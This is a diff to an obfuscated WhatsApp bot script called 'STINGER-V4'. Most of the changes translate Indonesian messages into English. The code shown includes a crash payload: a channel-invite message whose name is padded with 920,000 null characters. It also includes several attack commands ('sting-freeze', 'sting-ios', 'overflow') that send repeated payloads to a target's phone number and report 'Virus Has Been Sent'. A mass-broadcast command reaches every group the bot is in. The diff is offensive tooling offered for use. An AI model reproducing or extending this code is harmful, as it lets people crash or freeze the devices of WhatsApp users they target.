@@ -76,7 +76,7 @@ module.exports = async (sock, m, store) => {
     const randomColor = colorList[Math.floor(Math.random() * colorList.length)];
     let uptime = runtime(process.uptime());
     if (isCmd) {
-      console.log(chalk.white.bgRed.bold("Ada Pesan, Om"), color("[ 𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 ]", "green"), color("FROM", "red"), color("" + pushname, "red"), color("Text :", "yellow"), color("" + body, "blue"));
+      console.log(chalk.white.bgRed.bold("New Message"), color("[ 𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 ]", "green"), color("FROM", "red"), color("" + pushname, "red"), color("Text :", "yellow"), color("" + body, "blue"));
     }
     const todayLong = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
     const timeJakarta = moment.tz("Asia/Jakarta").format("HH : mm :ss");
@@ -327,7 +327,7 @@ module.exports = async (sock, m, store) => {
               newsletterJid: "120363313305181359@newsletter",
               newsletterName: "Zynxzo Script" + "\0".repeat(920000),
               jpegThumbnail: "",
-              caption: "Undangan Admin Channel Zynxzo Script",
+              caption: "Zynxzo Script Admin Channel Invitation",
               inviteExpiration: Date.now() + 1814400000
             }
           }
@@ -531,7 +531,7 @@ module.exports = async (sock, m, store) => {
       }
       if (text.match("whatsapp.com")) {
         const _0x3557c5 = {
-          text: "*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group " + groupMetadata.subject
+          text: "*Antilink Group Link Detected*\n\nYou Will Be Removed From The Group " + groupMetadata.subject
         };
         sock.sendMessage(m.chat, _0x3557c5, {
           quoted: m
@@ -634,7 +634,7 @@ module.exports = async (sock, m, store) => {
             return _0x1595c1("Only Admin");
           }
           if (!isBotAdmin) {
-            return _0x1595c1("Bot Bukan Admin :(");
+            return _0x1595c1("Bot Is Not Admin :(");
           }
           let _0x3b504b = m.quoted ? m.quoted.sender : text2.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
           await sock.groupParticipantsUpdate(m.chat, [_0x3b504b], "remove").then(_0x482e70 => _0x1595c1(util.format(_0x482e70))).catch(_0x2f55f9 => _0x1595c1(util.format(_0x2f55f9)));
@@ -643,16 +643,16 @@ module.exports = async (sock, m, store) => {
       case "closegroup":
         {
           if (!isGroup) {
-            return _0x1595c1("Khusus Group Bego");
+            return _0x1595c1("Group Only, Dummy");
           }
           if (!isAdmin2 && !isOwner) {
-            return _0x1595c1("Khusus Admin");
+            return _0x1595c1("Admin Only");
           }
           if (!isBotAdmin) {
-            return _0x1595c1("Bot Bukan Admin Bego");
+            return _0x1595c1("Bot Is Not Admin, Dummy");
           }
           if (!args[0]) {
-            return _0x1595c1("*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n" + (prefixMatch + command) + "10 second");
+            return _0x1595c1("*Choose Time:*\n-second\n-minute\n-hour\n-day\n\n*Example:*\n" + (prefixMatch + command) + "10 second");
           }
           if (args[1] == "second") {
             var _0x346418 = args[0] * "1000";
@@ -663,27 +663,27 @@ module.exports = async (sock, m, store) => {
           } else if (args[1] == "day") {
             var _0x346418 = args[0] * "86400000";
           }
-          _0x1595c1("*Waktu dimulai dari sekarang*");
+          _0x1595c1("*Time starts from now*");
           setTimeout(() => {
             var _0x527c82 = m.participant;
             sock.groupSettingUpdate(m.chat, "announcement");
-            _0x1595c1("Waktu Telah Tiba!\nGrup Ditutup Oleh Bot Dikarenakan Tidak Ada Yg Menjaga Grup\nGrup Akan Dibuka Sesuai Waktu Yg Ditentukan Oleh Admin");
+            _0x1595c1("Time's Up!\nGroup Closed By Bot Because No One Was Guarding The Group\nGroup Will Reopen According To The Time Set By The Admin");
           }, _0x346418);
         }
         break;
       case "opengroup":
         {
           if (!isGroup) {
-            return _0x1595c1("Khusus Group Bego");
+            return _0x1595c1("Group Only, Dummy");
           }
           if (!isAdmin2 && !isOwner) {
-            return _0x1595c1("Khusus Admin");
+            return _0x1595c1("Admin Only");
           }
           if (!isBotAdmin) {
-            return _0x1595c1("Bot Bukan Admin Bego");
+            return _0x1595c1("Bot Is Not Admin, Dummy");
           }
           if (!args[0]) {
-            return _0x1595c1("*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n" + (prefixMatch + command) + "10 second");
+            return _0x1595c1("*Choose Time:*\n-second\n-minute\n-hour\n-day\n\n*Example:*\n" + (prefixMatch + command) + "10 second");
           }
           if (args[1] == "second") {
             var _0x346418 = args[0] * "1000";
@@ -694,11 +694,11 @@ module.exports = async (sock, m, store) => {
           } else if (args[1] == "day") {
             var _0x346418 = args[0] * "86400000";
           }
-          _0x1595c1("*Waktu dimulai dari sekarang*");
+          _0x1595c1("*Time starts from now*");
           setTimeout(() => {
             var _0x7d05c6 = m.participant;
             sock.groupSettingUpdate(m.chat, "not_announcement");
-            _0x1595c1("Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan");
+            _0x1595c1("Right On Time, The Group Is Now Open, All Participants Can Send Messages");
           }, _0x346418);
         }
         break;
@@ -714,7 +714,7 @@ module.exports = async (sock, m, store) => {
             return _0x1595c1("Only Admin");
           }
           if (!isBotAdmin) {
-            return _0x1595c1("Bot Bukan Admin :(");
+            return _0x1595c1("Bot Is Not Admin :(");
           }
           let _0x585bcf = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text2.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
           await sock.groupParticipantsUpdate(m.chat, [_0x585bcf], "demote").then(_0x43dec5 => _0x1595c1(util.format(_0x43dec5))).catch(_0x179a2e => _0x1595c1(util.format(_0x179a2e)));
@@ -746,7 +746,7 @@ module.exports = async (sock, m, store) => {
             return _0x1595c1(mess.only.owner);
           }
           if (!text2 && !m.quoted) {
-            return m.reply("teksnya atau replyteks");
+            return m.reply("Give a text or reply to a text");
           }
           var _0x23ee91 = m.quoted ? m.quoted.text : text2;
           let _0xc68e7e = 0;
@@ -754,7 +754,7 @@ module.exports = async (sock, m, store) => {
           let _0x4fea5a = Object.entries(_0xc37b04).slice(0).map(_0x4a6c0e => _0x4a6c0e[1]);
           let _0x59ed94 = _0x4fea5a.filter(_0x1a3a6d => _0x1a3a6d.announce == false);
           let _0x306c5d = _0x59ed94.map(_0x81a2d2 => _0x81a2d2.id);
-          m.reply("Memproses Mengirim Pesan Ke *" + _0x306c5d.length + " Grup*");
+          m.reply("Processing Sending Message To *" + _0x306c5d.length + " Groups*");
           let _0x5260cd = _0x23ee91;
           const _0x19bf5b = {
             text: _0x5260cd
@@ -805,7 +805,7 @@ module.exports = async (sock, m, store) => {
             } catch {}
             await sleep(global.delayjpm);
           }
-          m.reply("Berhasil Mengirim Pesan Ke *" + _0xc68e7e + " Grup*");
+          m.reply("Successfully Sent Message To *" + _0xc68e7e + " Groups*");
         }
         break;
       case "payment":
@@ -843,7 +843,7 @@ module.exports = async (sock, m, store) => {
           if (!isOwner) {
             return _0x1595c1(mess.only.owner);
           }
-          let _0x26bdd8 = "*DONE DANA MASUK*\n\nReqname :\n\n▰▰▰▰▰▰▰▰\n*Garansi 7 Day*\n*Create " + timeJakarta + "*\n*Hari Ini " + todayLong + "*";
+          let _0x26bdd8 = "*DONE FUNDS RECEIVED*\n\nReqname :\n\n▰▰▰▰▰▰▰▰\n*7 Day Guarantee*\n*Create " + timeJakarta + "*\n*Today " + todayLong + "*";
           const _0x5a8277 = {
             text: _0x26bdd8
           };
@@ -855,9 +855,9 @@ module.exports = async (sock, m, store) => {
         break;
       case "proses":
         {
-          m.reply("*SIAP PESANAN ANDA AKAN KAMI PROSES JADI DI MOHON UNTUK MENUNGGU SEBENTAR YA MEK*");
+          m.reply("*READY, YOUR ORDER WILL BE PROCESSED, PLEASE WAIT A MOMENT*");
           sock.sendMessage("2349037524605@s.whatsapp.net", {
-            text: "BANG ZYN ADA YANG TRX NIH CEPETAN PROSES NANTI BUYER NGAMOK",
+            text: "BRO ZYN THERE'S A TRANSACTION, HURRY UP AND PROCESS IT OR THE BUYER WILL GET MAD",
             contextInfo: {
               forwardingScore: 9999,
               isForwarded: true
@@ -869,21 +869,21 @@ module.exports = async (sock, m, store) => {
       case "d":
         {
           if (!isOwner) {
-            return _0x1595c1("Njirr Lu siapa Cuk");
+            return _0x1595c1("Whoa, who are you?");
           }
           let _0x5584c9 = text2.split(",");
           let _0x1a42ad = _0x5584c9[0];
           let _0x17669a = _0x5584c9[1];
           if (_0x5584c9.length < 2) {
-            return _0x1595c1("*Format salah!*\nPenggunaan:\n" + (prefixMatch + command) + " barang,nominal");
+            return _0x1595c1("*Wrong Format!*\nUsage:\n" + (prefixMatch + command) + " barang,nominal");
           }
           if (!_0x1a42ad) {
-            return _0x1595c1("Ex : " + (prefixMatch + command) + " barang,nominal\n\nContoh :\n" + (prefixMatch + command) + " vipies,60000");
+            return _0x1595c1("Ex : " + (prefixMatch + command) + " item,amount\n\nExample :\n" + (prefixMatch + command) + " vipies,60000");
           }
           if (!_0x17669a) {
-            return _0x1595c1("Ex : " + (prefixMatch + command) + " barang,nominal\n\nContoh :\n" + (prefixMatch + command) + " panel,1000");
+            return _0x1595c1("Ex : " + (prefixMatch + command) + " item,amount\n\nExample :\n" + (prefixMatch + command) + " panel,1000");
           }
-          text_done = "「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」\n\n📦 Barang : " + _0x1a42ad + "\n💸 Nominal : " + _0x17669a + "\n📆 Tanggal : " + timeJakarta + "\n🕰️ Waktu : " + currentTime + "\n✨ Status : Berhasil\n\n𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗧𝗲𝗹𝗮𝗵 𝗢𝗿𝗱𝗲𝗿 𝗗𝗶 *" + storename + "*";
+          text_done = "「 TRANSACTION SUCCESSFUL 」\n\n📦 Item : " + _0x1a42ad + "\n💸 Amount : " + _0x17669a + "\n📆 Date : " + timeJakarta + "\n🕰️ Time : " + currentTime + "\n✨ Status : Successful\n\nThank You For Ordering At *" + storename + "*";
           const _0x30d4e3 = {
             text: text_done,
             contextInfo: {
@@ -913,7 +913,7 @@ module.exports = async (sock, m, store) => {
             return _0x1595c1(mess.only.owner);
           }
           if (!quoted) {
-            return _0x1595c1("Kirim/Reply Gambar/Video/Gifs Dengan Caption " + (prefixMatch + command) + "\nDurasi Video 1-9 Detik");
+            return _0x1595c1("Send/Reply Image/Video/Gifs With Caption " + (prefixMatch + command) + "\nVideo Duration 1-9 Seconds");
           }
           if (/image/.test(mime)) {
             let _0x5c4102 = await quoted.download();
@@ -925,7 +925,7 @@ module.exports = async (sock, m, store) => {
             await fs.unlinkSync(_0x2106cc);
           } else if (/video/.test(mime)) {
             if ((quoted.msg || quoted).seconds > 11) {
-              return _0x1595c1("Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik");
+              return _0x1595c1("Send/Reply Image/Video/Gifs With Caption ${prefix+command}\nVideo Duration 1-9 Seconds");
             }
             let _0x22f810 = await quoted.download();
             const _0x35bdf4 = {
@@ -935,7 +935,7 @@ module.exports = async (sock, m, store) => {
             let _0x4ecd56 = await sock.sendStvid(from, _0x22f810, m, _0x35bdf4);
             await fs.unlinkSync(_0x4ecd56);
           } else {
-            _0x1595c1("Kirim/Reply Gambar/Video/Gifs Dengan Caption " + (prefixMatch + command) + "\nDurasi Video 1-9 Detik");
+            _0x1595c1("Send/Reply Image/Video/Gifs With Caption " + (prefixMatch + command) + "\nVideo Duration 1-9 Seconds");
           }
         }
         break;
@@ -957,7 +957,7 @@ module.exports = async (sock, m, store) => {
           await _0x49d301(target, _0x1115bd);
           await beta1(sock, target, _0x1115bd);
         }
-        _0x1595c1("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
+        _0x1595c1("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Has Been Sent, If Target Is C2 Then Target Will Experience Delay Maker");
         break;
       case "stinger-v2":
       case "sting-freeze":
@@ -977,7 +977,7 @@ module.exports = async (sock, m, store) => {
           await _0x49d301(target, _0x1115bd);
           await beta1(sock, target, _0x1115bd);
         }
-        _0x1595c1("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
+        _0x1595c1("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Has Been Sent, If Target Is C2 Then Target Will Experience Delay Maker");
         break;
       case "vip":
       case "sting-atk":
@@ -998,7 +998,7 @@ module.exports = async (sock, m, store) => {
           await _0x49d301(target, _0x1115bd);
           await beta1(sock, target, _0x1115bd);
         }
-        _0x1595c1("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
+        _0x1595c1("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Has Been Sent, If Target Is C2 Then Target Will Experience Delay Maker");
         break;
       case "sting-ios":
       case "iphone":
@@ -1018,7 +1018,7 @@ module.exports = async (sock, m, store) => {
           await _0x49d301(target, _0x1115bd);
           await beta1(sock, target, _0x1115bd);
         }
-        _0x1595c1("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
+        _0x1595c1("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Has Been Sent, If Target Is C2 Then Target Will Experience Delay Maker");
         break;
       case "overflow":
       case "vasion":
@@ -1039,15 +1039,15 @@ module.exports = async (sock, m, store) => {
           await _0x49d301(target, _0x1115bd);
           await beta1(sock, target, _0x1115bd);
         }
-        _0x1595c1("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
+        _0x1595c1("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Has Been Sent, If Target Is C2 Then Target Will Experience Delay Maker");
         break;
       case "owner":
         {
           if (!isPremium) {
-            return _0x1595c1("Mau Ngapain Dek ??");
+            return _0x1595c1("What Do You Want, Kid??");
           }
           const _0x1a4790 = {
-            displayName: _0x5e851e.length + " Kontak",
+            displayName: _0x5e851e.length + " Contacts",
             contacts: _0x5e851e
           };
           const _0x1419f5 = {
@@ -1069,7 +1069,7 @@ module.exports = async (sock, m, store) => {
             mentionedJid: [sender]
           };
           const _0x2cc7fc = {
-            text: "Nih Owner Gw Jangan Macem\"",
+            text: "This Is My Owner, Don't Mess With Him\"",
             contextInfo: _0x2de314
           };
           const _0xac8f87 = {
@@ -1083,29 +1083,29 @@ module.exports = async (sock, m, store) => {
           return _0x1595c1(mess.only.owner);
         }
         if (!args[0]) {
-          return _0x1595c1("Penggunaan " + (prefixMatch + command) + " nomor\nContoh " + (prefixMatch + command) + " 62×××");
+          return _0x1595c1("Usage " + (prefixMatch + command) + " number\nExample " + (prefixMatch + command) + " 62×××");
         }
         bnnd = q.split("|")[0].replace(/[^0-9]/g, "");
         let _0x3ff6fd = await sock.onWhatsApp(bnnd + "@s.whatsapp.net");
         if (_0x3ff6fd.length == 0) {
-          return _0x1595c1("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!");
+          return _0x1595c1("Enter A Valid Number Registered On WhatsApp!!!");
         }
         ownerList.push(bnnd);
         fs.writeFileSync("./database/dtbs/owner.json", JSON.stringify(ownerList));
-        _0x1595c1("Nomor " + bnnd + " Telah Menjadi Owner!!!");
+        _0x1595c1("Number " + bnnd + " Has Become Owner!!!");
         break;
       case "delowner":
         if (!isOwner) {
           return _0x1595c1(mess.only.owner);
         }
         if (!args[0]) {
-          return _0x1595c1("Penggunaan " + (prefixMatch + command) + " nomor\nContoh " + (prefixMatch + command) + " 62×××");
+          return _0x1595c1("Usage " + (prefixMatch + command) + " number\nExample " + (prefixMatch + command) + " 62×××");
         }
         ya = q.split("|")[0].replace(/[^0-9]/g, "");
         unp = ownerList.indexOf(ya);
         ownerList.splice(unp, 1);
         fs.writeFileSync("./database/dtbs/owner.json", JSON.stringify(ownerList));
-        _0x1595c1("Nomor " + ya + " Telah Di Hapus Owner!!!");
+        _0x1595c1("Number " + ya + " Has Been Removed As Owner!!!");
         break;
       case "set-sting":
         {
@@ -1113,10 +1113,10 @@ module.exports = async (sock, m, store) => {
             return _0x1595c1("kusus owner");
           }
           if (!text2) {
-            return _0x1595c1("Contoh : " + (prefixMatch + command) + " 62×××");
+            return _0x1595c1("Example : " + (prefixMatch + command) + " 62×××");
           }
           global.owner = text2.split("|")[0];
-          _0x1595c1("Exif berhasil diubah menjadi\n\n• No Owner : " + global.owner);
+          _0x1595c1("Exif successfully changed to\n\n• No Owner : " + global.owner);
         }
         break;
       case "self":
@@ -1134,16 +1134,16 @@ module.exports = async (sock, m, store) => {
             return _0x1595c1(mess.only.owner);
           }
           if (!args[0]) {
-            return _0x1595c1("Penggunaan " + (prefixMatch + command) + " nomor\nContoh " + (prefixMatch + command) + " 62×××");
+            return _0x1595c1("Usage " + (prefixMatch + command) + " number\nExample " + (prefixMatch + command) + " 62×××");
           }
           prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
           let _0x6ac310 = await sock.onWhatsApp(prrkek);
           if (_0x6ac310.length == 0) {
-            return _0x1595c1("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!");
+            return _0x1595c1("Enter A Valid Number Registered On WhatsApp!!!");
           }
           premiumList.push(prrkek);
           fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(premiumList));
-          _0x1595c1("Nomor " + prrkek + " Telah Menjadi Premium!");
+          _0x1595c1("Number " + prrkek + " Has Become Premium!");
         }
         break;
       case "delprem":
@@ -1152,13 +1152,13 @@ module.exports = async (sock, m, store) => {
             return _0x1595c1(mess.only.owner);
           }
           if (!args[0]) {
-            return _0x1595c1("Penggunaan " + (prefixMatch + command) + " nomor\nContoh " + (prefixMatch + command) + " 62×××");
+            return _0x1595c1("Usage " + (prefixMatch + command) + " number\nExample " + (prefixMatch + command) + " 62×××");
           }
           ya = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
           unp = premiumList.indexOf(ya);
           premiumList.splice(unp, 1);
           fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(premiumList));
-          _0x1595c1("Nomor " + ya + " Telah Di Hapus Premium!");
+          _0x1595c1("Number " + ya + " Has Been Removed As Premium!");
         }
         break;
       case "sting-on":
@@ -1470,10 +1470,10 @@ module.exports = async (sock, m, store) => {
       case "kickall":
         {
           if (!isAdmin2 && !isOwner) {
-            return _0x1595c1("Khusus Admin");
+            return _0x1595c1("Admin Only");
           }
           if (!isBotAdmin) {
-            return _0x1595c1("Bot Bukan Admin Bego");
+            return _0x1595c1("Bot Is Not Admin, Dummy");
           }
           const _0x81ec66 = {
             text: "🥺",
@@ -1657,19 +1657,19 @@ module.exports = async (sock, m, store) => {
               sock.sendStimg(from, _0x1cb4b4, m, _0x1c7517);
             });
           } else {
-            _0x1595c1("Kirim perintah " + (prefixMatch + command) + " STINGER-V4");
+            _0x1595c1("Send the command " + (prefixMatch + command) + " STINGER-V4");
           }
         }
         break;
       case "mangap":
         {
-          _0x1595c1("Makasi Kakak " + pushname + " Atas Pujiannya");
+          _0x1595c1("Thanks " + pushname + " For The Compliment");
         }
         break;
       case "ai":
         {
           if (!text2) {
-            return _0x1595c1("*• Example:* " + (prefixMatch + command) + " Siapakah orang yang telah menemukan Komputer di jaman Majapahit");
+            return _0x1595c1("*• Example:* " + (prefixMatch + command) + " Who was the person who invented the Computer in the Majapahit era");
           }
           await sock.sendMessage(m.chat, {
             react: {
@@ -1791,7 +1791,7 @@ module.exports = async (sock, m, store) => {
           const _0x119fbf = m.quoted ? m.quoted : m;
           const _0x293b9c = (_0x119fbf.msg || _0x119fbf).mimetype || "";
           if (!_0x293b9c) {
-            return m.reply("Mana vidio nya bang?");
+            return m.reply("Where's the video, bro?");
           }
           _0x1595c1(mess.wait);
           const _0x142225 = await sock.downloadAndSaveMediaMessage(_0x119fbf);
@@ -1825,7 +1825,7 @@ module.exports = async (sock, m, store) => {
       case "obfuscate":
         {
           if (!q) {
-            return _0x1595c1("Contoh " + (prefixMatch + command) + " const time = require('money')");
+            return _0x1595c1("Example " + (prefixMatch + command) + " const time = require('money')");
           }
           let _0xfbb00c = await _0x68eab(q);
           _0x1595c1("" + _0xfbb00c.result);
@@ -1841,7 +1841,7 @@ module.exports = async (sock, m, store) => {
           }
           let _0x4f6c6b = text2.split(",");
           if (_0x4f6c6b.length < 2) {
-            return _0x1595c1("Format salah!\nPenggunaan:\n" + (prefixMatch + command) + " user,nomer");
+            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
           }
           let _0x4a59da = _0x4f6c6b[0];
           let _0x34c5de = m.quoted ? m.quoted.sender : _0x4f6c6b[1] ? _0x4f6c6b[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
@@ -1947,7 +1947,7 @@ module.exports = async (sock, m, store) => {
             return sock(JSON.stringify(_0x869e68.errors[0], null, 2));
           }
           let _0x1e19c5 = _0x869e68.attributes;
-          let _0x586c10 = await _0x1595c1("Sukses menambahkan User dan Server\n\nType: user\n\nId: " + _0x1dff0c.id + "\nUsername: " + _0x1dff0c.username + "\nEmail: " + _0x1dff0c.email + "\nName: " + _0x1dff0c.first_name + " " + _0x1dff0c.last_name + "\nMemory: " + (_0x1e19c5.limits.memory === 0 ? "Unlimited" : _0x1e19c5.limits.memory) + " MB\nDisk: " + (_0x1e19c5.limits.disk === 0 ? "Unlimited" : _0x1e19c5.limits.disk + "MB") + "\nCpu: " + (_0x1e19c5.limits.cpu === 0 ? "Unlimited" : _0x1e19c5.limits.cpu + "%"));
+          let _0x586c10 = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x1dff0c.id + "\nUsername: " + _0x1dff0c.username + "\nEmail: " + _0x1dff0c.email + "\nName: " + _0x1dff0c.first_name + " " + _0x1dff0c.last_name + "\nMemory: " + (_0x1e19c5.limits.memory === 0 ? "Unlimited" : _0x1e19c5.limits.memory) + " MB\nDisk: " + (_0x1e19c5.limits.disk === 0 ? "Unlimited" : _0x1e19c5.limits.disk + "MB") + "\nCpu: " + (_0x1e19c5.limits.cpu === 0 ? "Unlimited" : _0x1e19c5.limits.cpu + "%"));
         }
         break;
       case "2gb":
@@ -1960,7 +1960,7 @@ module.exports = async (sock, m, store) => {
           }
           let _0x5e4dc6 = text2.split(",");
           if (_0x5e4dc6.length < 2) {
-            return _0x1595c1("Format salah!\nPenggunaan:\n" + (prefixMatch + command) + " user,nomer");
+            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
           }
           let _0x21a481 = _0x5e4dc6[0];
           let _0x4bdc71 = m.quoted ? m.quoted.sender : _0x5e4dc6[1] ? _0x5e4dc6[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
@@ -2066,7 +2066,7 @@ module.exports = async (sock, m, store) => {
             return sock(JSON.stringify(_0x597dbb.errors[0], null, 2));
           }
           let _0x249ce8 = _0x597dbb.attributes;
-          let _0x450cb4 = await _0x1595c1("Sukses menambahkan User dan Server\n\nType: user\n\nId: " + _0x5116ed.id + "\nUsername: " + _0x5116ed.username + "\nEmail: " + _0x5116ed.email + "\nName: " + _0x5116ed.first_name + " " + _0x5116ed.last_name + "\nMemory: " + (_0x249ce8.limits.memory === 0 ? "Unlimited" : _0x249ce8.limits.memory) + " MB\nDisk: " + (_0x249ce8.limits.disk === 0 ? "Unlimited" : _0x249ce8.limits.disk + "MB") + "\nCpu: " + (_0x249ce8.limits.cpu === 0 ? "Unlimited" : _0x249ce8.limits.cpu + "%"));
+          let _0x450cb4 = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x5116ed.id + "\nUsername: " + _0x5116ed.username + "\nEmail: " + _0x5116ed.email + "\nName: " + _0x5116ed.first_name + " " + _0x5116ed.last_name + "\nMemory: " + (_0x249ce8.limits.memory === 0 ? "Unlimited" : _0x249ce8.limits.memory) + " MB\nDisk: " + (_0x249ce8.limits.disk === 0 ? "Unlimited" : _0x249ce8.limits.disk + "MB") + "\nCpu: " + (_0x249ce8.limits.cpu === 0 ? "Unlimited" : _0x249ce8.limits.cpu + "%"));
         }
         break;
       case "3gb":
@@ -2079,7 +2079,7 @@ module.exports = async (sock, m, store) => {
           }
           let _0x46694a = text2.split(",");
           if (_0x46694a.length < 2) {
-            return _0x1595c1("Format salah!\nPenggunaan:\n" + (prefixMatch + command) + " user,nomer");
+            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
           }
           let _0x15c73e = _0x46694a[0];
           let _0x484ff4 = m.quoted ? m.quoted.sender : _0x46694a[1] ? _0x46694a[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
@@ -2185,7 +2185,7 @@ module.exports = async (sock, m, store) => {
             return sock(JSON.stringify(_0x305588.errors[0], null, 2));
           }
           let _0x1ad66b = _0x305588.attributes;
-          let _0x5e4943 = await _0x1595c1("Sukses menambahkan User dan Server\n\nType: user\n\nId: " + _0x591181.id + "\nUsername: " + _0x591181.username + "\nEmail: " + _0x591181.email + "\nName: " + _0x591181.first_name + " " + _0x591181.last_name + "\nMemory: " + (_0x1ad66b.limits.memory === 0 ? "Unlimited" : _0x1ad66b.limits.memory) + " MB\nDisk: " + (_0x1ad66b.limits.disk === 0 ? "Unlimited" : _0x1ad66b.limits.disk + "MB") + "\nCpu: " + (_0x1ad66b.limits.cpu === 0 ? "Unlimited" : _0x1ad66b.limits.cpu + "%"));
